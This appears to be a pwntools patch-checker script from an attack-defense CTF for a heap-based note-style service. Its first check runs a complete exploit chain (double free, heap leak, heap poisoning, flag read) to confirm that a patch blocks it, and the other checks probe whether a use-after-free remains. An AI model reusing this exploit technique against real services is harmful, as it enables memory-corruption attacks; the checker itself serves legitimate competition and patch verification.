#!/usr/bin/python2.7
# coding:utf-8
# eg: python check.py 192.168.8.101 8888
from sys import *
from pwn import *
import time
host = argv[1]
port = int(argv[2])
timeout = 30

# except return Correct/Error info, not return another info
context.log_level = 'critical'


def add(f,Type,number=1):
	f.sendafter(">","1")
	f.sendafter(">",str(Type))
	f.sendafter("number",str(number))
def dele(f,Type):
	f.sendafter(">","2")
	f.sendafter(">",str(Type))
def show(f,Type):
	f.sendafter(">","3")
	f.sendafter(">",str(Type))
def getIO():
    return remote(host, port, timeout=timeout)

def check1():
    try:
        f=getIO()
	f.settimeout(0.3)
	add(f,1)
	add(f,2)
	## get a double free pt
	dele(f,1)
	add(f,2)
	dele(f,1)
	##get a fake largebin
	for i in range(5):
		add(f,2)
	show(f,1)
	f.recvuntil("number :")
	heap_addr=int(f.recvline().strip(),10)
	success("heap_addr :%x"%heap_addr)
	dele(f,2)
	add(f,1,heap_addr)
	dele(f,2)
	add(f,1,heap_addr)

	add(f,2,heap_addr-0x10)
	add(f,2)
	add(f,2,0xb1)
	for i in range(7):
		dele(f,1)
		add(f,2)
	dele(f,1)
	show(f,1)
	f.recvuntil("number :")
	file_no_addr=int(f.recvline().strip(),10)-0x230
	add(f,2,file_no_addr)
	add(f,1)
	add(f,1,666)
	f.sendafter(">","4") #get flag
	f.recvuntil(" :")
	flag=f.recvuntil(" we have received").strip("we have received")
	if "flag{" in flag:
		raise Exception, "flag can still be read"
	return True
    except Exception as err:
		if "flag" in err.message:
			raise Exception, "check1 error "+err.message 
		else:
			return True	#maybe the patch make the exp not avalible 
# check free,malloc module and invalid show 
def check2(): 
	try:
		f = getIO()
		add(f,1,str(301224))
		show(f,1)
		f.recvuntil("number :")
		content=f.recvline()
		if "301224" not in content:
			raise Exception, "malloc has been patched,invalid!"    
		dele(f,1)
		show(f,1)
		content=f.recvrepeat(timeout=2)
		if "301224" in content:
			raise Exception, "free has been patched,invalid!"     
		if "your int type inode number :0" in content:
			raise Exception, "vuln:show after free has not been patched !"     
		return True
	except Exception as e:
		if "patched,invalid" or "not been patched" in e.message:
			raise Exception, "check2 error "+e.message 
		else:
			raise Exception, "check2 error ,basic function has been patched"

# if want to add check, Please insert function like check3(p),check4(p) ...
def check3():
    try:
		f = getIO()
		add(f,1)
		add(f,2)
		for i in range(9):
			dele(f,1)
			add(f,2)
		return True
    except Exception as e:
        # add your check error description
        raise Exception, "Check3 error, "+"UAF vuln has not been patched!"

def checker():
    try:
        # add your check function name
        if check1() and check2() and check3():
            return (True, "IP: "+host+" OK")
    except Exception as e:
        return (False, "IP: "+host+" is down, "+str(e))

if __name__ == '__main__':
    print(checker())
